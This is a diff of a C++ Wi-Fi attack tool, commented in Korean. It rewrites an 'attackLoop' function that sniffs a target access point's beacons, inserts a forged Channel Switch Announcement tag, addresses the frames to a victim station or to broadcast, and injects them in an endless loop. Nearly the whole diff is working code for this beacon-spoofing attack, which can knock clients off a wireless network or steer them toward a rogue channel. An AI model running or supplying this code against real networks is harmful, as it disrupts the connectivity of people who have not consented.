@@ -1,60 +1,102 @@
 #include <cstdio>
 #include <cstring>
 #include <unistd.h>
+#include <vector>
 #include <pcap.h>
 #include "param.h"
 #include "dot11.h"
 #include "radiotap.h"
 
-int getRadiotapLen(const uint8_t* pkt) {
-    uint16_t len;
-    memcpy(&len, pkt + 2, sizeof(len));
-    return (int)len;
-}
-
 void attackLoop(pcap_t* handle) {
-    // 첫 패킷으로 radiotap 길이 확인
-    struct pcap_pkthdr* header;
-    const uint8_t* pkt;
-    while (pcap_next_ex(handle, &header, &pkt) == 0);
-    int rtLen = getRadiotapLen(pkt);
-
-    // radiotap에서 FCS 여부 판별
-    RadioTapHdr rtHdr;
-    memcpy(&rtHdr, pkt, sizeof(rtHdr));
-    bool fcs = rtHdr.has_fcs();
-
-    // beacon 캡처
-    uint8_t beaconBuf[4096];
-    int beaconLen = 0;
-    if (!captureBeacon(handle, args_.apMac, rtLen, beaconBuf, &beaconLen)) {
-        fprintf(stderr, "[-] Failed to capture beacon\n");
-        return;
-    }
-
-    // CSA 패킷 빌드
-    uint8_t csaBuf[4096];
-    int csaLen = buildCsaPacket(beaconBuf, beaconLen, rtLen, fcs,
-                                csaBuf, sizeof(csaBuf));
-    if (csaLen <= 0) {
-        fprintf(stderr, "[-] Failed to build CSA packet\n");
-        return;
-    }
-
-    Mac bcast("ff:ff:ff:ff:ff:ff");
+    Mac station;
+    if (args_.hasStation)
+        station = args_.staMac;
+    else
+        station = Mac("ff:ff:ff:ff:ff:ff");
 
     int count = 0;
     while (true) {
-        if (!args_.hasStation)
-            setAddr1(csaBuf, rtLen, bcast);
-        else
-            setAddr1(csaBuf, rtLen, args_.staMac);
+        struct pcap_pkthdr* header;
+        const uint8_t* pkt;
 
-        if (pcap_sendpacket(handle, csaBuf, csaLen) != 0)
-            fprintf(stderr, "sendpacket error: %s\n", pcap_geterr(handle));
+        int res = pcap_next_ex(handle, &header, &pkt);
+        if (res == 0) continue;
+        if (res < 0) break;
+
+        // radiotap 길이
+        uint16_t rtLen;
+        memcpy(&rtLen, pkt + 2, sizeof(rtLen));
+
+        int minLen = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
+        if ((int)header->caplen < minLen) continue;
+
+        // beacon 확인
+        Dot11Hdr dot11;
+        memcpy(&dot11, pkt + rtLen, sizeof(Dot11Hdr));
+        if (!dot11.isBeacon()) continue;
+        if (!(dot11.addr2_ == args_.apMac)) continue;
+
+        // FCS 크기
+        RadioTapHdr rtHdr;
+        memcpy(&rtHdr, pkt, sizeof(RadioTapHdr));
+        size_t fcsSize = rtHdr.get_fcs();
+
+        // tagged params 범위
+        int tagStart = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
+        int tagEnd = (int)header->caplen - (int)fcsSize;
+
+        // CSA 태그 준비
+        BeaconHdr::CsaTag csa;
+        csa.number = 0x25;
+        csa.length = 0x03;
+        csa.channelSwitchMode = 0x01;
+        csa.newChannel = 0x0B;
+        csa.channelSwitchCount = 0x03;
+
+        // tag 순회하며 CSA 삽입 (tag number 정렬 유지)
+        std::vector<uint8_t> newTags;
+        bool csaInserted = false;
+        int pos = tagStart;
+
+        while (pos + 2 <= tagEnd) {
+            uint8_t tagNum = pkt[pos];
+            uint8_t tagLen = pkt[pos + 1];
+
+            if (tagNum == 0x25) {
+                // 기존 CSA 있으면 교체
+                newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
+                csaInserted = true;
+                pos += 2 + tagLen;
+                continue;
+            }
+            if (!csaInserted && tagNum > 0x25) {
+                // 정렬 위치에 삽입
+                newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
+                csaInserted = true;
+            }
+            if (pos + 2 + tagLen > tagEnd) break;
+            newTags.insert(newTags.end(), pkt + pos, pkt + pos + 2 + tagLen);
+            pos += 2 + tagLen;
+        }
+
+        if (!csaInserted) {
+            newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
+        }
+
+        // 새 패킷 조립: [Radiotap][Dot11Hdr+Fix][수정된 Tags]
+        std::vector<uint8_t> newPacket;
+        newPacket.insert(newPacket.end(), pkt, pkt + tagStart);
+        newPacket.insert(newPacket.end(), newTags.begin(), newTags.end());
+
+        // addr1 교체
+        int addr1Offset = rtLen + 4;
+        memcpy(newPacket.data() + addr1Offset, station.mac_, 6);
+
+        if (pcap_inject(handle, newPacket.data(), newPacket.size()) < 0)
+            fprintf(stderr, "inject error: %s\n", pcap_geterr(handle));
 
         count++;
-        printf("\r[*] Sent %d CSA beacon(s)...", count);
+        printf("\rSent %d CSA beacon", count);
         fflush(stdout);
         usleep(100000);
     }
